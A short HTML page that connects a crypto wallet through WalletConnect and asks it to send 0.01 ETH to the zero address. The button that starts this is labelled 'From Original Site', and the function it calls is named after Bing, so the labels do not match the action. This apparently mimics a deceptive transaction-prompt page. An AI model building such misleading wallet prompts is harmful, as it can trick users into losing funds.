<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <style>
    .button {
      background-color: #4CAF50;
      border: none;
      color: white;
      padding: 15px 32px;
      text-align: center;
      text-decoration: none;
      display: inline-block;
      font-size: 16px;
      margin: 4px 2px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.7.4/dist/web3-provider.min.js"></script>
  <script>
    const providerOptions = {
      rpc: {
        1: 'https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID', // Replace with your Infura Project ID
      },
    };

    async function openBingAndPromptTransaction() {
      const web3Provider = new WalletConnectProvider(providerOptions);

      try {
        // Enable the WalletConnect session
        await web3Provider.enable();

        // Check if the wallet is connected
        if (web3Provider.connected) {
          alert('Wallet connected successfully!');
          await promptEthTransaction(web3Provider);
        }
      } catch (error) {
        alert('Wallet connection request failed or was rejected.');
      }
    }

    async function promptEthTransaction(provider) {
      try {
        const accounts = await provider.request({ method: 'eth_accounts' });
        const from = accounts[0];

        const transactionParameters = {
          nonce: "0x00",
          gasPrice: "0x244AC6D",
          gas: "0x12A52",
          to: "0x0000000000000000000000000000000000000000",
          from: from,
          value: "0x2386F26FC10000",
          data: "0x00",
          chainId: "0x1",
        };

        const txHash = await provider.request({
          method: "eth_sendTransaction",
          params: [transactionParameters],
        });

        alert(`Transaction sent: ${txHash}`);
      } catch (error) {
        alert('Ethereum transaction request failed or was rejected.');
      }
    }
  </script>
  <center>
    <input type="button" class="button" value="From Original Site" onclick="openBingAndPromptTransaction()">
  </center>
</body>
</html>
